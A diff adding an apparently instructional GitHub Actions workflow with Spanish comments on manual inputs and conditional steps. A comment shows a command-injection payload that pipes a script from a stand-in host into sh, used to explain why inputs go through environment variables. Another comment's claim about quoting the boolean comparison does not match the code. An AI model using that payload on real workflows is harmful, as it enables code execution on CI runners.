@@ -1,0 +1,109 @@
+# =========================================================
+# TAREA 2: Workflow manual con inputs
+# =========================================================
+# Los "inputs" son campos de formulario que GitHub muestra al
+# pulsar el botón "Run workflow". Sirven para reutilizar el mismo
+# workflow con parámetros distintos (desplegar a staging o a
+# producción, en modo de prueba o en real...).
+# =========================================================
+
+name: 02 - Manual
+
+on:
+  workflow_dispatch:
+    inputs:
+      logging_level:
+        description: 'Nivel de log'
+        required: true
+        # Si el usuario no cambia nada, se usa este valor
+        default: 'info'
+        # type: choice muestra un desplegable en vez de una caja de texto.
+        # Así el usuario no puede escribir un valor inválido.
+        type: choice
+        options:
+          - debug
+          - info
+          - warning
+          - error
+
+      environment:
+        description: 'Entorno de despliegue'
+        required: true
+        type: choice
+        options:
+          - staging
+          - production
+
+      dry_run:
+        description: 'Ejecutar sin aplicar cambios'
+        default: false
+        # type: boolean muestra una casilla de verificación
+        type: boolean
+
+      reason:
+        description: 'Motivo de la ejecución'
+        default: 'Manual execution'
+        type: string
+
+jobs:
+  manual:
+    runs-on: ubuntu-24.04
+
+    steps:
+      - name: Mostrar los inputs recibidos
+        # ---------------------------------------------------------
+        # ⚠️ ESTO ES IMPORTANTE, Y EL ENUNCIADO INSISTE EN ELLO.
+        #
+        # Paso los inputs por VARIABLES DE ENTORNO (env) y NO los
+        # interpolo directamente dentro del "run" así:
+        #
+        #     run: echo "${{ inputs.reason }}"     ❌ PELIGROSO
+        #
+        # ¿Por qué es peligroso? Porque GitHub sustituye el ${{ }}
+        # ANTES de ejecutar el script, pegando el texto tal cual.
+        # Si alguien escribiera en el campo "reason" algo como:
+        #
+        #     "; curl http://malo.com/robar.sh | sh; echo "
+        #
+        # ese comando se ejecutaría en el runner. Es una inyección
+        # de comandos, el mismo problema que la inyección SQL.
+        #
+        # Con env, el valor se pasa como DATO al proceso y bash lo
+        # trata siempre como texto, nunca como código.
+        # ---------------------------------------------------------
+        env:
+          LOGGING_LEVEL: ${{ inputs.logging_level }}
+          ENVIRONMENT: ${{ inputs.environment }}
+          DRY_RUN: ${{ inputs.dry_run }}
+          REASON: ${{ inputs.reason }}
+        run: |
+          echo "Nivel de log: $LOGGING_LEVEL"
+          echo "Entorno:      $ENVIRONMENT"
+          echo "Dry run:      $DRY_RUN"
+          echo "Motivo:       $REASON"
+
+      # ---------------------------------------------------------
+      # "if" decide si un step se ejecuta o se salta.
+      # Dentro de un "if" NO hacen falta las llaves ${{ }}:
+      # GitHub ya sabe que ahí va una expresión.
+      #
+      # Ojo con un detalle: aunque el input sea de tipo boolean,
+      # al llegar aquí es el TEXTO "true" o "false". Por eso
+      # comparo con el string entre comillas y no con true a secas.
+      # ---------------------------------------------------------
+      - name: Deploy
+        if: inputs.dry_run == false
+        env:
+          ENVIRONMENT: ${{ inputs.environment }}
+        run: echo "Deploying to $ENVIRONMENT"
+
+      - name: Dry run
+        if: inputs.dry_run == true
+        env:
+          ENVIRONMENT: ${{ inputs.environment }}
+        # Uso el bloque "|" (multilínea) en vez de escribirlo en una
+        # sola línea porque el texto lleva dos puntos seguidos de un
+        # espacio ("DRY RUN: ...") y YAML lo interpretaría como el
+        # inicio de otra clave, rompiendo el archivo.
+        run: |
+          echo "DRY RUN: no se aplica ningún cambio en $ENVIRONMENT"
